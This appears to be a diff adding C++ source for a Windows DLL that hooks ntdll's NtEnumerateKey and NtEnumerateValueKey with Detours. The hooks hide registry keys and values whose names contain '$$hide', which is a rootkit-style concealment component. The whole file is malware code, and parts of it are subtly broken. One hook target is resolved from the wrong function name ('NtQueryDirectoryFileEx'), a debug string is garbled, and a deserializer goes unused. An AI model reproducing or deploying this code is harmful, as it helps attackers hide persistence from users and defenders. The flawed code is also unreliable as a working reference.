@@ -1,0 +1,109 @@
+#include <stdio.h>
+#include <Windows.h>
+#include <shlwapi.h>
+#include "pch.h"
+#include "detours.h"
+#include <string>
+#include <vector>
+#include <Winternl.h>
+#include "resolve.h"
+
+using namespace std;
+
+#define HIDE_REG L"$$hide"
+
+NtEnumerateKey_t origNtEnumerateKey = NULL;
+NtEnumerateValueKey_t origNtEnumerateValueKey = NULL;
+
+WCHAR* CustomWcsStrI(const WCHAR* str, const WCHAR* substr) {
+    if (str == NULL || substr == NULL) {
+        return NULL;
+    }
+    size_t strLen = wcslen(str);
+    size_t substrLen = wcslen(substr);
+
+    for (size_t i = 0; i <= strLen - substrLen; ++i) {
+        if (_wcsnicmp(str + i, substr, substrLen) == 0) {
+            return (WCHAR*)(str + i);
+        }
+    }
+    return NULL;
+}
+
+std::vector<std::wstring> deserializeWStringVector(std::wstring fileName) {
+    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
+    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
+    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
+    std::vector<std::wstring> deserializedData;
+    size_t pos = 0;
+    std::wstring token;
+    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
+        token = serializedData.substr(0, pos);
+        deserializedData.push_back(token);
+        serializedData.erase(0, pos + 1);
+    }
+    if (!serializedData.empty()) {
+        deserializedData.push_back(serializedData);
+    }
+    return deserializedData;
+}
+
+NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
+    OutputDebugString(L"HookedNtEnumerateKey");
+    NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
+    WCHAR* keyName = NULL;
+
+    if (KeyInformationClass == KeyBasicInformation) keyName = ((KEY_BASIC_INFORMATION*)KeyInformation)->Name;
+    if (KeyInformationClass == KeyNameInformation) keyName = ((KEY_NAME_INFORMATION*)KeyInformation)->Name;
+
+    if (CustomWcsStrI(keyName, HIDE_REG)) {
+        ZeroMemory(KeyInformation, Length);
+        status = STATUS_NO_MORE_ENTRIES;
+    }
+    return status;
+};
+
+
+NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
+    OutputDebugString(L"HookedNtEnumerateKeaaaaaaaaaay");
+    NTSTATUS status = origNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
+    WCHAR* keyValueName = NULL;
+
+    if (KeyValueInformationClass == KeyValueBasicInformation) keyValueName = ((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->Name;
+    if (KeyValueInformationClass == KeyValueFullInformation) keyValueName = ((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->Name;
+
+    // check if the it matches the hidden key
+    if (CustomWcsStrI(keyValueName, HIDE_REG)) {
+        ZeroMemory(KeyValueInformation, Length);
+        status = STATUS_NO_MORE_ENTRIES;
+    }
+    return status;
+};
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH: {
+        origNtEnumerateValueKey = (NtEnumerateValueKey_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtEnumerateValueKey");
+        origNtEnumerateKey = (NtEnumerateKey_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQueryDirectoryFileEx");
+        DetourTransactionBegin();
+        DetourUpdateThread(GetCurrentThread());
+        DetourAttach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
+        DetourAttach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
+        DetourTransactionCommit();
+        break;
+    }
+    case DLL_PROCESS_DETACH:
+        DetourTransactionBegin();
+        DetourUpdateThread(GetCurrentThread());
+        DetourDetach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
+        DetourDetach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
+        DetourTransactionCommit();
+        break;
+
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+        break;
+    }
+
+    return TRUE;
+}
